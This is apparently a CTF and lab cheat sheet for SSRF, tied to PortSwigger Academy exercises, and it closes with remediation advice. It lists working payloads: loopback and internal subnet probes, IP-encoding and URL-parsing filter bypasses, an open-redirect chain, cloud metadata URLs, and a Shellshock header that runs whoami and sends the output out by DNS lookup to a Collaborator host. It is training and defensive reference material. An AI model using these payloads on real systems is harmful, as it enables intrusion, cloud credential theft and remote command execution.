# Server-Side Request Forgery (SSRF) — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, Burp Collaborator, Burp Intruder  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

SSRF allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

1. **Locate Target Parameters:** Identify features that import/fetch external resources:
   - Stock checkers (`stockApi=http://...`)
   - URL downloaders / preview generators
   - Webhooks / OAuth callbacks
   - PDF / image generators
   - Headers processed server-side (`Referer`, `X-Forwarded-For`)
2. **Determine Injection Type:**
   - **In-Band:** Backend response (status, HTML, JSON) reflected to user.
   - **Blind:** Server makes the request, but response is not returned (requires timing or out-of-band Collaborator probes).
3. **Probe Targets:**
   - **Loopback:** `127.0.0.1`, `localhost`
   - **Cloud Metadata:** `169.254.169.254` (AWS, GCP, Azure, DigitalOcean)
   - **Internal Subnets:** `192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`
4. **Bypass Filters:** Use IP representations, open redirects, URL parsing ambiguities, or DNS rebinding.

---

## 2. In-Band SSRF Exploitation

### 1. Loopback / Localhost Access
```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin/delete?username=carlos
```
*Alternative loopbacks:* `http://127.0.0.1/admin`

---

### 2. Scanning Internal Subnets via Burp Intruder

When the vulnerability connects to an internal RFC 1918 network:
```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.§1§:8080/admin
```
1. Send request to **Intruder**.
2. Set position on the final IP octet (`§1§`).
3. Payload: Numbers `1` to `255`, step `1`.
4. Run attack and sort by status code / length: Look for `200 OK` (active internal admin console) vs `500 Internal Server Error` (unreachable host).

---

## 3. Filter Bypasses & Evasion

### 1. Blacklist Bypasses (Bypassing `127.0.0.1` and `localhost`)

| Format | Representation |
|---|---|
| **Short IP** | `http://127.1/` |
| **Zero IP** | `http://0/` or `http://0.0.0.0/` |
| **Decimal IP** | `http://2130706433/` *(Calculated from 127.0.0.1)* |
| **Hex IP** | `http://0x7f000001/` |
| **Octal IP** | `http://017700000001/` |
| **IPv6 Equivalent** | `http://[::1]/` or `http://[::]/` |
| **DNS resolving to localhost** | `http://localtest.me/` or `http://spoofed.burpcollaborator.net/` |

---

### 2. Whitelist Bypasses (Bypassing `must start with target.com`)

When the application checks that the URL begins with a trusted domain:

#### Embedded Credentials Syntax (`@`):
```text
http://127.0.0.1@stock.weliketoshop.net/admin
```

#### URL Fragment Identifier (`#`):
```text
http://localhost#@stock.weliketoshop.net/admin
```
*(Double URL-encode the `#` to `%2523` if the server decodes URL components before fetching)*:
```text
http://localhost%2523@stock.weliketoshop.net/admin
```

#### Subdomain Manipulation:
```text
http://stock.weliketoshop.net.attacker.com/
```

---

### 3. Bypassing SSRF Filters via Open Redirection

If the SSRF filter strictly validates hostnames, but an open redirect exists on a whitelisted domain:

1. Identify open redirect on the target site:
   ```http
   GET /product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin HTTP/2
   ```
2. Feed the open redirect URL into the SSRF parameter:
   ```http
   POST /product/stock HTTP/2
   Content-Type: application/x-www-form-urlencoded

   stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
   ```
   *Result:* The SSRF validator accepts `/product/nextProduct` (safe domain), and follows the 302 redirect to the prohibited internal IP.

---

## 4. Blind SSRF & OAST Detection

When the server processes a URL in headers or background jobs without reflecting the response:

### 1. Probing via `Referer` Header
Many analytics and caching engines fetch URLs from the `Referer` header:
```http
GET /product?productId=1 HTTP/2
Host: target.net
Referer: http://BURP-COLLABORATOR-SUBDOMAIN
```
Check Burp Collaborator client for incoming DNS and HTTP requests.

---

### 2. Blind SSRF Chained with Shellshock

When internal legacy servers process HTTP headers, inject a Shellshock payload via blind SSRF:

1. Send request to Intruder:
   ```http
   GET /product?productId=1 HTTP/2
   Host: target.net
   Referer: http://192.168.0.§1§:8080/
   User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
   ```
2. Brute-force internal subnet `1..255`.
3. Check Collaborator for DNS queries confirming remote command execution.

---

## 5. CTF Quick Reference

| Defense Encountered | Bypass Strategy | Example Payload |
|---|---|---|
| **Blacklist: 127.0.0.1** | Short IP / Decimal / Hex | `http://127.1/` or `http://2130706433/` |
| **Blacklist: "admin"** | Double URL-encode | `http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65` |
| **Whitelist: domain check** | Credential `@` + Fragment `#` | `http://localhost%2523@target.com/admin` |
| **Strict Whitelist** | Chain with Open Redirect | `stockApi=/redirect?url=http://192.168.0.1/` |
| **Blind Injection** | Header injection (Referer) | `Referer: http://BURP-COLLAB/` |
| **Cloud Target** | AWS / Azure Metadata | `http://169.254.169.254/latest/meta-data/` |

---

## 6. Remediation

- **Network-Level Segmentation:** Block backend application servers from initiating connections to internal subnets (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.169.254`).
- **Strict URL Whitelisting:** Validate protocol, hostname, and port against a strict allowlist.
- **Disable HTTP Redirect Following:** Configure HTTP clients not to follow redirects automatically.
- **DNS Resolution Verification:** Resolve DNS before connection and verify that the destination IP does not resolve to private or loopback ranges (prevents DNS rebinding).
